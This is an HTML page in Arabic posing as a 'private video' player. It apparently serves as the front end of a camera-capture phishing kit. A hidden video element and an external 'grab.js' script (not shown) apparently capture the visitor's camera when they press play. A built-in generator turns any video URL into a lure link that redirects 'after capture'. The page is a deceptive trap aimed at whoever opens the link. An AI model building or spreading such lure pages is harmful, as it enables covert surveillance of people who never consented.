<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>مشاهدة الفيديو</title>
<link rel="stylesheet" href="/static/style.css">
<style>
  .creator-box { background: #12121a; border: 1px solid #1f1f2b; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
  .creator-box input { width: 100%; padding: 10px; background: #0b0b0f; border: 1px solid #2c2c3a; color: #fff; border-radius: 6px; margin-top: 8px; box-sizing: border-box; }
  .creator-box button { margin-top: 10px; background: #4f46e5; color: #fff; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; width: 100%; }
  .creator-box button:hover { background: #4338ca; }
  .gen-link { margin-top: 10px; word-break: break-all; font-size: 13px; color: #38bdf8; }
</style>
</head>
<body>
<div class="wrap">
  <!-- أداة توليد الرابط تظهر فقط إذا لم يتم تمرير رابط مسبقاً -->
  <div class="creator-box" id="creatorBox" style="display:none;">
    <h3>أداة إنشاء رابط التجربة</h3>
    <p class="sub">ضع أي رابط فيديو تريد توجيه هاتفك إليه بعد الالتقاط:</p>
    <input type="text" id="targetInput" placeholder="https://www.youtube.com/watch?v=...">
    <button id="genBtn">توليد الرابط</button>
    <div class="gen-link" id="resultLink"></div>
  </div>

  <div class="player">
    <div class="poster" id="poster">
      <div class="play-btn" id="playBtn">▶</div>
      <div class="poster-text">فيديو خاص — اضغط للمشاهدة</div>
    </div>
    <video id="preview" playsinline muted></video>
  </div>
  <div class="meta">
    <div class="title">مشاهدة الفيديو</div>
    <div class="sub" id="status">جارٍ التحميل...</div>
  </div>
</div>
<script>
  // إظهار أداة الصانع إذا لم يكن هناك بارامتر url في الرابط
  if (!location.search.includes('url=')) {
    document.getElementById('creatorBox').style.display = 'block';
    document.getElementById('genBtn').onclick = () => {
      const val = document.getElementById('targetInput').value.trim();
      if (!val) return alert('الرجاء وضع رابط صحيح');
      const generated = location.origin + '/?url=' + encodeURIComponent(val);
      document.getElementById('resultLink').innerHTML = 'انسخ هذا الرابط وافتحه في هاتفك:<br><a href="' + generated + '" target="_blank">' + generated + '</a>';
    };
  }
</script>
<script src="/static/grab.js"></script>
</body>
</html>
